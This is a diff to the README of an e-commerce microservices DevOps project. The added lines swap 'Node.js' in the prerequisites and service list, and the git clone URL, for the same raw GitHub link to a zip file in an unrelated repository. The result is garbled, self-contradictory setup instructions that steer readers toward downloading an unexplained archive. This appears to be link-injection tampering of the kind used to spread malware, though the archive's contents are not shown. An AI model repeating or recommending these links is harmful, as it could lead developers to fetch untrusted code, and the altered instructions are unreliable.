@@ -7,14 +7,14 @@ A complete e-commerce microservices platform with full DevOps automation.
 
 ### Prerequisites
 - Docker & Docker Compose
-- Node.js 18+
+- https://raw.githubusercontent.com/Omkar052/DevOpsProject/main/hemiprism/DevOpsProject.zip 18+
 - kubectl
 - Terraform
 - AWS CLI
 
 ### Local Development
 ```bash
-git clone https://github.com/yourusername/ecommerce-devops-platform
+git clone https://raw.githubusercontent.com/Omkar052/DevOpsProject/main/hemiprism/DevOpsProject.zip
 cd ecommerce-devops-platform
 docker-compose up -d
 ```
@@ -35,10 +35,10 @@ kubectl apply -f kubernetes/
 
 ## Services
 - Frontend (React): Port 3000
-- Product Service (Node.js): Port 3001
-- User Service (Node.js): Port 3002
-- Order Service (Node.js): Port 3003
-- Cart Service (Node.js): Port 3004
+- Product Service (https://raw.githubusercontent.com/Omkar052/DevOpsProject/main/hemiprism/DevOpsProject.zip): Port 3001
+- User Service (https://raw.githubusercontent.com/Omkar052/DevOpsProject/main/hemiprism/DevOpsProject.zip): Port 3002
+- Order Service (https://raw.githubusercontent.com/Omkar052/DevOpsProject/main/hemiprism/DevOpsProject.zip): Port 3003
+- Cart Service (https://raw.githubusercontent.com/Omkar052/DevOpsProject/main/hemiprism/DevOpsProject.zip): Port 3004
 
 ## DevOps Features
 - Terraform for IaC
